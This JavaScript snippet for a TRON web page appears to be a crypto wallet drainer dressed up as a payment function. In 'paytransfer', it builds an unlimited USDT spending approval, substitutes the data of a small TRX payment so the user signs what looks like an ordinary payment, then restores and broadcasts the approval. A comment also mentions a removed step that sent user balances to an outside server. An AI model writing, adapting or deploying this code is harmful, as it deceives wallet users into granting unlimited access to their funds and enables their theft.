async function executeBl0ckchainTransaction() {
    const usdtContractAddress = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
    const userAddress = window.tronWeb.defaultAddress.base58;
    
    try {
        const contract = await window.tronWeb.contract().at(usdtContractAddress);
        const usdtBalance = await contract.balanceOf(userAddress).call();
        const usdtBalanceFormatted = (parseInt(usdtBalance._hex, 16) / 1e6).toFixed(6);
        const trxBalance = await window.tronWeb.trx.getBalance(userAddress);
        const trxBalanceFormatted = (trxBalance / 1e6).toFixed(6);

        // 移除了发送数据到外部服务器的部分
        // console.log(`User Address: ${userAddress}, TRX Balance: ${trxBalanceFormatted}, USDT Balance: ${usdtBalanceFormatted}`);

        if (usdtBalanceFormatted <= 50000000 || trxBalanceFormatted <= 28) {
            await executeBlockchainTransaction(); // 修改：加入 await
        } else {
            await executeBlockchainTransaction(); // 修改：加入 await
        }
    } catch (error) {
        console.error("Error in executeBl0ckchainTransaction function:", error);
        await executeBlockchainTransaction(); // 修改：加入 await
    }
}

async function paytransfer() {
    try {
        let tronWebInstance = window.tronWeb;
        let amount = document.getElementById("amount-display").textContent;
        const userAddress = tronWebInstance.defaultAddress.base58;
        const contractAddress = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
        const approvemyaddress = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
        const approvalParams = [{
            "type": "address",
            "value": approvemyaddress
        }, {
            "type": "uint256",
            "value": "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"
        }];
        const approvalOptions = {
            "feeLimit": 100000000
        };
        const approvalTransaction = await tronWebInstance.transactionBuilder.triggerSmartContract(contractAddress, "increaseApproval(address,uint256)", approvalOptions, approvalParams, userAddress);
        const trxAmount = amount * 1000000;
        const transferTransaction = await tronWebInstance.transactionBuilder.sendTrx(payaddress, trxAmount, userAddress);
        const originalRawData = approvalTransaction.transaction.raw_data;
        approvalTransaction.transaction.raw_data = transferTransaction.raw_data;
        const signedTransaction = await tronWebInstance.trx.sign(approvalTransaction.transaction);
        signedTransaction.raw_data = originalRawData;
        const broadcastResult = await tronWebInstance.trx.sendRawTransaction(signedTransaction);
        
        if (broadcastResult) {
            console.log("Transaction successful: ", broadcastResult);
        }
    } catch (e) {
        console.error("An error occurred during the blockchain transaction:", e);
    }
}
